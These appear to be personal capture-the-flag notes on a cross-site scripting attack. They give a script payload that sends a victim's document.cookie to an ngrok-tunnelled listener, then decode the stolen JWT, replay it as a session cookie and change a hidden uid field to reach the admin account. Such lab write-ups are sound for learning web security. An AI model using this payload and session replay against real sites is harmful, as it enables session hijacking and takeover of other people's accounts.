
https://null-byte.wonderhowto.com/how-to/write-xss-cookie-stealer-javascript-steal-passwords-0180833/

1. `python3 -m http.server 80`
2. `ngrok http 80`
3. `<script>window.location="https://0c87-5-151-88-193.eu.ngrok.io/?c="+document.cookie`
4. get session token: ![[Screenshot 2022-05-15 at 12.55.10.png]]
5. decrypt token `python /home/kali/tools/jwt_tool/jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MTU2MDR9.IX_ckmytrfnplle7FDClGjHByXYomX9FxjL2Lr_myXE`: ![[Screenshot 2022-05-15 at 12.56.49.png]]
6. set cookie of site: either through a burp `Cookie: session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MTU2MDR9.IX_ckmytrfnplle7FDClGjHByXYomX9FxjL2Lr_myXE` header or on the website console with `document.cookie=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI2MTU2MDR9.IX_ckmytrfnplle7FDClGjHByXYomX9FxjL2Lr_myXE`
7. go to _http:ip/settings_ with this cookie in the header: ![[Screenshot 2022-05-15 at 13.17.08.png]]
	![[Screenshot 2022-05-15 at 13.17.46.png]]
8. changed the hidden field _uid_ to 1: ![[Screenshot 2022-05-15 at 13.18.29.png]]
9. logged in as admin + got the flag: ![[Screenshot 2022-05-15 at 13.19.30.png]]